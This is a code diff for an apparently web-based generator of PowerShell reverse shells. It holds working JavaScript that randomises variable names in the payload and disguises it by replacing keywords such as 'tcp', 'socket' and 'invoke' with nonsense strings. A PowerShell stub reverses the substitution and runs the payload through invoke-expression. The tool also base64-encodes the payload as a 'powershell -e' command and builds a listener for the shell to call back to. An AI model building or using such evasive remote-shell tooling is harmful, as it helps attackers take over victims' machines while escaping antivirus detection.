@@ -28,13 +28,27 @@ const listenersRaw = [listenerOne, listenerTwo, listenerThree, listenerFour, lis
 const mangleExprPre = '$mangledStr=\'';
 const mangleExprPost = '\';$staticStrArr="new","net","client","tcp","object","new","mkfifo","socket","tmp","security","ssl","stream","\$","buff","out","system","proto","expre","invoke","flush","auth",".",";";$replaceStrArr="dfi1","wiggleworm","nOt4t0","d00d1eb0p","unpotat","soiledpeanuts","tinylittledragons","thetiniestofhorses","capitalismisascam","bramblebush","ins4ecureSilly","456yt","\@\@\@\^","muscleperverts","inniebellybutton","ponishouldponiponi","ayylemone","testicles","lololol","teppidwater","orderhotwaterataniceresteraunt","deee","onoamouse";$demangledStr=$mangledStr;for($i=0;$i -le $staticStrArr.length;$i++){$demangledStr = $demangledStr -replace $replaceStrArr[$i],$staticStrArr[$i]};invoke-expression $demangledStr&'
 
-// const mangleExprPost = '\';$staticStrArr="new","net","client","tcp","object","new","mkfifo","socket","tmp","security","ssl","stream","\$","buff","out","system","proto","expre","invoke","flush","auth",".",";";$replaceStrArr="dfi1","wiggleworm","nOt4t0","d00d1eb0p","unpotat","soiledpeanuts","tinylittledragons","thetiniestofhorses","capitalismisascam","bramblebush","ins4ecureSilly","456yt","\\@\\@\\@\\^","muscleperverts","inniebellybutton","ponishouldponiponi","ayylemone","testicles","lololol","teppidwater","orderhotwaterataniceresteraunt","deee","onoamouse";$demangledStr=$mangledStr;for($i=0;$i -le $staticStrArr.length;$i++){$demangledStr = $demangledStr -replace $replaceStrArr[$i],$staticStrArr[$i];$staticStrArr[$i];$replaceStrArr[$i]};invoke-expression $demangledStr&'
-
 const replaceStrArr = ['dfi1', 'wiggleworm', 'nOt4t0', 'd00d1eb0p', 'unpotat', 'soiledpeanuts', 'tinylittledragons', 'thetiniestofhorses', 'capitalismisascam','bramblebush', 'ins4ecureSilly', '456yt', '@@@^', 'muscleperverts', 'inniebellybutton', 'ponishouldponiponi', 'ayylemone', 'testicles', 'lololol', 'teppidwater', 'orderhotwaterataniceresteraunt', 'deee', 'onoamouse'];
 
 const findStrArr = [/new/gi, /net/gi, /client/gi, /tcp/gi, /object/gi, /new/gi, /mkfifo/gi, /socket/gi, /tmp/gi, /security/gi, /ssl/gi, /stream/gi, /\$/gi, /buff/gi, /out/gi, /system/gi, /proto/gi, /expre/gi, /invoke/gi, /flush/gi, /auth/gi, /\./gi, /;/gi];
 
 const staticStrArr = ['new', 'net', 'client', 'tcp', 'object', 'new', 'mkfifo', 'socket', 'tmp', 'security', 'ssl', 'stream', '$', 'buff', 'out', 'system', 'proto', 'expre', 'invoke', 'flush', 'auth', '.', ';'];
+
+function setContents(elemId, elemContents) {
+    document.getElementById(elemId).innerHTML = elemContents;
+}
+
+function showId(elemId) {
+    document.getElementById(elemId).style.display = "block";
+}
+
+function hideId(elemId) {
+    document.getElementById(elemId).style.display = "none";
+}
+
+function getVal(elemId) {
+    return document.getElementById(elemId).value;
+}
 
 function mangleRevShell(revShellStr) {
     let mangiemut = revShellStr;
@@ -95,15 +109,8 @@ function encodeUTF16LE(str) { // props Keveun https://stackoverflow.com/question
     return String.fromCharCode.apply( String, byteArray );
 }
 
-
 function genShell() {
-    const host = document.getElementById("host").value;
-    const port = document.getElementById("port").value;
     const rstype = document.getElementById("rstype").value;
-    const listenertype = document.getElementById("listenertype").value;
-    const minLen = document.getElementById("minLen").value;
-    const maxLen = document.getElementById("maxLen").value;
-
     const psRevStringRaw = psRevRaw[rstype];
     encodePS(psRevStringRaw);
 }
@@ -136,52 +143,56 @@ function configShell(rawShellString, host, port/*, shell*/) {
 }
 
 function psEncodeBase64Exe(shellStr) {
+    // for `powershell -e $base64EncodedData` to work, the commands need to be first encoded into Unicode/UTF-16 LE (Windows default) than base64 encoded
     const psEncodedlUTF16LE = encodeUTF16LE(shellStr);
     const base64EncodedPSExecutable = "powershell -e " + btoa(psEncodedlUTF16LE);
     return base64EncodedPSExecutable;
 }
 
 function encodePS(rawShellString, listenerShow=true) {
-    const host = document.getElementById("host").value;
-    const port = document.getElementById("port").value;
-    const rstype = document.getElementById("listenertype").value;
-    const minLen = document.getElementById("minLen").value;
-    const maxLen = document.getElementById("maxLen").value;
+    const host = getVal("host");
+    const port = getVal("port");
+    const rstype = getVal("listenertype");
+    const minLen = getVal("minLen");
+    const maxLen = getVal("maxLen");
 
     let matchies = rawShellString.match(/\$(?!null|zero|false|true|script|buffer)[a-z0-9-_]{1,30}/gi);
 
-    const varsLen = matchies.length;
-
-    let randVarSubArr = new Array();
-    let moddedCmdString = configShell(rawShellString, host, port);
-
-    for(let i=0; i<varsLen; i++) {
-        const newRandVar = randVarname(minLen, maxLen);
-
-        randVarSubArr.push(newRandVar);
-
-        moddedCmdString = moddedCmdString.replaceAll(matchies[i], newRandVar);
+    if(matchies) {
+        const varsLen = matchies.length;
+        
+        let randVarSubArr = new Array();
+        var moddedCmdString = configShell(rawShellString, host, port);
+        
+        for(let i=0; i<varsLen; i++) {
+            const newRandVar = randVarname(minLen, maxLen);
+        
+            randVarSubArr.push(newRandVar);
+        
+            moddedCmdString = moddedCmdString.replaceAll(matchies[i], newRandVar);
+        }
+    } else {
+        moddedCmdString = rawShellString;
     }
 
-    // for `powershell -e $base64EncodedData` to work, the commands need to be first encoded into Unicode/UTF-16 LE (Windows default) than base64 encoded
-    // const psEncodedlUTF16LE = encodeUTF16LE(moddedCmdString);
-    // const base64EncodedPSExecutable = "powershell -e " + btoa(psEncodedlUTF16LE);
     const base64EncodedPSExecutable = psEncodeBase64Exe(moddedCmdString);
     const mangledCmd = mangleRevShell(moddedCmdString);
     const mangEncCmd = psEncodeBase64Exe(mangleRevShell(moddedCmdString).slice(0, -1));
-    console.log(mangleRevShell(moddedCmdString).slice(0, -1));
     const listener = configShell(listenersRaw[rstype], host, port);
-    document.getElementById("hiddenOutput").innerHTML = base64EncodedPSExecutable;
-    document.getElementById("hiddenUnencoded").innerHTML = moddedCmdString;
-    document.getElementById("mangledpayload").innerHTML = mangledCmd;
-    document.getElementById("mangledencodedpayload").innerHTML = mangEncCmd;
-    document.getElementById("listener").innerHTML = listener;
-    document.getElementById("encodedDiv").style.display = "block";
-    document.getElementById("unencodedDiv").style.display = "block";
-    document.getElementById("mangledDiv").style.display = "block";
-    document.getElementById("mangledEncodedDiv").style.display = "block";
+
+    setContents("hiddenOutput", base64EncodedPSExecutable);
+    setContents("hiddenUnencoded", moddedCmdString);
+    setContents("mangledpayload", mangledCmd);
+    setContents("mangledencodedpayload", mangEncCmd);
+    setContents("listener", listener);
+
+    showId("encodedDiv");
+    showId("unencodedDiv");
+    showId("mangledDiv");
+    showId("mangledEncodedDiv");
+
     if(listenerShow) {
-        document.getElementById("listenerDiv").style.display = "block";
+        showId("listenerDiv");
     }
 
 }
@@ -198,21 +209,59 @@ function copyCmd(textarea, doneMsg) {
     document.getElementById(doneMsg).style.display = "inline";
 
     setTimeout(function() {
-        document.getElementById(doneMsg).style.display = "none";
+        hideId(doneMsg);
         document.getSelection().removeAllRanges()
     }, 500);
 }
 
 function swapMode(mode) {
     if(mode == 'revshell') {
-        document.getElementById('revshellgencontainer').style.display = "block";
-        document.getElementById('encodepscontainer').style.display = "none";
+        showId('revshellgencontainer');
+
+        hideId('encodepscontainer');
+        hideId('mangledDiv');
+        hideId('listenerDiv');
+        hideId("unencodedDiv");
+        hideId("mangledEncodedDiv");
     } else if(mode == 'psencode') {
-        document.getElementById('encodepscontainer').style.display = "block";
-        document.getElementById('revshellgencontainer').style.display = "none";
-        document.getElementById('listenerDiv').style.display = "none";
-        document.getElementById("unencodedDiv").style.display = "none";
+        showId('encodepscontainer');
+
+        hideId('mangledDiv');
+        hideId('revshellgencontainer');
+        hideId('listenerDiv');
+        hideId("unencodedDiv");
+        hideId("mangledEncodedDiv");
     }
 
-    document.getElementById('encodedDiv').style.display = "none"; // output div
+    hideId('encodedDiv'); // output div
+}
+
+function doHelp(subject) {
+    switch(subject) {
+        case 'randomvars':
+            helpText = 'randomized variables';
+            break;
+
+        case 'encoded':
+            helpText = 'base64 encoded';
+            break;
+
+        case 'mangled':
+            helpText = 'Mangled by substituting common strings with nonsense and then reversing the process on the fly';
+            break;
+
+        case 'mangledencoded':
+            helpText = 'first variables are randomized, then it is mangled, then it is base64 encoded';
+            break;
+        
+        case 'listener':
+            helpText = 'this is run on your server to listen for when the reverse shell dials back to you';
+            break;
+
+        default:
+            helpText = 'ERROR: Help text not found uwu sowwy~';
+            break;
+    }
+
+    alert(helpText);
 }
